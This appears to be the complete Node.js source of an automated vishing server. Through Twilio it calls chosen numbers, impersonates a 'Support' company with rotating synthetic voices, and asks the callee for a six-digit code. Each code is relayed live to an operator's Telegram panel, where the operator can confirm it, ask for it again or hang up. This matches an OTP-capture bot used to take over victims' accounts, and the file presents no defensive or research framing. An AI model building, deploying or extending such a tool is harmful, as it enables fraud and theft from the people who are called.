const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")
const twilio=require("twilio")

const app=express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const PORT=process.env.PORT||3000

// ===== ENV =====
const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID

const TWILIO_ACCOUNT_SID=process.env.TWILIO_ACCOUNT_SID
const TWILIO_AUTH_TOKEN=process.env.TWILIO_AUTH_TOKEN
const TWILIO_NUMBER=process.env.TWILIO_NUMBER

const BASE_URL=process.env.BASE_URL

const client=twilio(TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN)

// ===== SETTINGS =====
let settings={
company:"Support",
digits:6,
assistant:0,
itemName:"reference number"
}

const assistants=[
{name:"Nova",voice:"Polly.Joanna"},
{name:"Lyra",voice:"Polly.Matthew"},
{name:"Orion",voice:"Polly.Amy"},
{name:"Astra",voice:"Polly.Brian"},
{name:"Kairo",voice:"Polly.Justin"},
{name:"Solara",voice:"Polly.Kendra"}
]

// ===== STATE =====
const calls=new Map()

let lastCaller=null
let lastDialed=null

let logs=[]
let panelMessageId=null
let pendingInput=null

// ===== HELPERS =====

function assistant(){
return assistants[settings.assistant]||assistants[0]
}

function pushLog(text){
logs.unshift(`${new Date().toLocaleTimeString()} ${text}`)
logs=logs.slice(0,20)
}

function getOrCreateCall(callSid){
if(!callSid)return null

if(!calls.has(callSid)){
calls.set(callSid,{
sid:callSid,
caller:null,
input:null,
status:"Idle",
startedAt:Date.now()
})
}

return calls.get(callSid)
}

function sortedCalls(){
return Array.from(calls.values()).sort((a,b)=>(b.startedAt||0)-(a.startedAt||0))
}

function callTimerText(call){
if(!call)return"00:00"

const total=Math.floor((Date.now()-call.startedAt)/1000)

const mm=String(Math.floor(total/60)).padStart(2,"0")
const ss=String(total%60).padStart(2,"0")

return`${mm}:${ss}`
}

// ===== TELEGRAM =====

async function tg(method,data){
const res=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
})
return res.json()
}

async function tgSend(text,buttons=null){

const body={
chat_id:CHAT_ID,
text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

return tg("sendMessage",body)

}

async function tgEdit(messageId,text,buttons=null){

const body={
chat_id:CHAT_ID,
message_id:messageId,
text
}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

return tg("editMessageText",body)

}

async function tgAnswerCallback(id,text=""){
try{
await tg("answerCallbackQuery",{callback_query_id:id,text})
}catch{}
}

// ===== PANEL =====

function panelButtons(){

return[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Retry",callback_data:"retry"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📞 Call Last",callback_data:"calllast"},
{text:"📲 Call",callback_data:"call"}
],
[
{text:"⚡ Wake Server",callback_data:"wake"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]
]

}

function panelText(){

const active=sortedCalls().slice(0,6)

let lines=["📞 LIVE CALLS",""]

if(!active.length){

lines.push("No active calls")

}else{

active.forEach((call,i)=>{

lines.push(`${i+1}) ${call.status}`)
lines.push(`Caller: ${call.caller||"Unknown"}`)
lines.push(`${settings.itemName}: ${call.input||"waiting"}`)
lines.push(`Time: ${callTimerText(call)}`)
lines.push("")

})

}

lines.push(`Company: ${settings.company}`)
lines.push(`Digits: ${settings.digits}`)
lines.push(`Assistant: ${assistant().name}`)
lines.push(`Item: ${settings.itemName}`)

return lines.join("\n")

}

async function updatePanel(forceNew=false){

try{

const text=panelText()
const buttons=panelButtons()

if(!panelMessageId||forceNew){

const msg=await tgSend(text,buttons)

if(msg.result)panelMessageId=msg.result.message_id

return

}

await tgEdit(panelMessageId,text,buttons)

}catch{}

}

// ===== CALL CONTROL =====

async function startCall(number){

if(!number)return

lastDialed=number

await client.calls.create({
url:`${BASE_URL}/ivr`,
to:number,
from:TWILIO_NUMBER,
statusCallback:`${BASE_URL}/call-status`,
statusCallbackEvent:["initiated","ringing","answered","completed"],
statusCallbackMethod:"POST"
})

pushLog(`Outbound call started to ${number}`)

}

function newestActiveCall(){
return sortedCalls().find(c=>c.status!=="Ended")||null
}

async function updateLiveCallTwiml(callSid,twiml){

if(!callSid)return

await client.calls(callSid).update({twiml})

}

async function endLiveCallImmediately(callSid){

if(!callSid)return

await client.calls(callSid).update({
twiml:`<Response><Hangup/></Response>`
})

}

// ===== ROOT =====

app.get("/",(req,res)=>{
res.send("Server running")
})

app.get("/ping",(req,res)=>{
res.send("pong")
})

// ===== CALL STATUS =====

app.post("/call-status",(req,res)=>{

const status=req.body.CallStatus
const from=req.body.From
const sid=req.body.CallSid

const call=getOrCreateCall(sid)

if(call){

if(from)call.caller=from

if(status==="ringing")call.status="Ringing"
if(status==="in-progress")call.status="Answered"
if(status==="completed")call.status="Ended"

}

updatePanel()

res.sendStatus(200)

})

// ===== IVR =====

app.post("/ivr",(req,res)=>{

const sid=req.body.CallSid
const from=req.body.From

const call=getOrCreateCall(sid)

if(call){

call.caller=from
call.status="Answered"
call.startedAt=Date.now()

}

lastCaller=from

updatePanel()

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistant().voice}">
Hello im calling from ${settings.company}. Please enter your ${settings.digits} digit ${settings.itemName}.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST"/>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`)

})

// ===== INPUT =====

app.post("/input",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

const call=getOrCreateCall(sid)

if(call){

call.caller=caller
call.input=digits
call.status="Answered"
call.startedAt=Date.now()

}

lastCaller=caller

pushLog(`${caller} : ${digits}`)

res.type("text/xml")

res.send(`
<Response>
<Say voice="${assistant().voice}">
Please wait while we review your ${settings.itemName}.
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`)

await tgSend(`📞 INPUT RECEIVED

Caller: ${caller}
${settings.itemName}: ${digits}`)

await updatePanel()

})

// ===== HOLD LOOP =====

app.post("/hold",(req,res)=>{

res.type("text/xml")

res.send(`
<Response>
<Pause length="10"/>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`)

})

// ===== TELEGRAM =====

app.post("/telegram",async(req,res)=>{

const update=req.body

try{

if(update.callback_query){

const action=update.callback_query.data
const callbackId=update.callback_query.id

const call=newestActiveCall()
const callSid=call?call.sid:null

if(action==="confirm"){

if(callSid){

await updateLiveCallTwiml(callSid,`
<Response>
<Say voice="${assistant().voice}">
Thank you. Your ${settings.itemName} has been confirmed.
</Say>
<Hangup/>
</Response>
`)

call.status="Ended"
pushLog("Confirmed")

}

await updatePanel()
await tgAnswerCallback(callbackId,"Confirmed")

}

if(action==="retry"){

if(callSid){

await updateLiveCallTwiml(callSid,`
<Response>
<Say voice="${assistant().voice}">
Please re-enter your ${settings.itemName}.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input"/>
</Response>
`)

call.input=null

pushLog("Retry requested")

}

await updatePanel()
await tgAnswerCallback(callbackId,"Retry sent")

}

if(action==="hangup"){

if(callSid){

await endLiveCallImmediately(callSid)

call.status="Ended"

pushLog("Hung up")

}

await updatePanel()
await tgAnswerCallback(callbackId,"Hung up")

}

if(action==="wake"){

await fetch(BASE_URL)
await fetch(BASE_URL+"/ping")
await fetch(BASE_URL+"/ivr")

await tgSend("⚡ Server wake request sent")

await tgAnswerCallback(callbackId,"Server waking")

}

if(action==="calllast"){

if(lastDialed){

await startCall(lastDialed)

await tgSend(`📞 Calling last dialed number ${lastDialed}`)

}else{

await tgSend("No previous outbound call")

}

await tgAnswerCallback(callbackId,"Calling")

}

if(action==="call"){

pendingInput="call"

await tgSend("Send number to call")

await tgAnswerCallback(callbackId,"Waiting for number")

}

if(action==="status"){

await updatePanel()

await tgAnswerCallback(callbackId,"Panel refreshed")

}

if(action==="logs"){

let text="📜 Logs\n\n"

logs.forEach(l=>text+=l+"\n")

await tgSend(text)

await tgAnswerCallback(callbackId,"Logs sent")

}

}

if(update.message&&update.message.text){

const text=update.message.text.trim()

if(pendingInput==="call"&&!text.startsWith("/")){

pendingInput=null

await startCall(text)

await tgSend(`📞 Calling ${text}`)

return res.sendStatus(200)

}

if(text==="/panel"||text==="/menu"||text==="/status"){

panelMessageId=null
await updatePanel(true)

}

if(text==="/logs"){

let textOut="📜 Logs\n\n"

logs.forEach(l=>textOut+=l+"\n")

await tgSend(textOut)

}

}

}catch(e){

console.log("/telegram error:",e.message)

}

res.sendStatus(200)

})

// ===== LIVE PANEL =====

setInterval(()=>{

if(panelMessageId)updatePanel()

},1000)

app.listen(PORT,()=>{
console.log("Server booted and ready for calls")
})
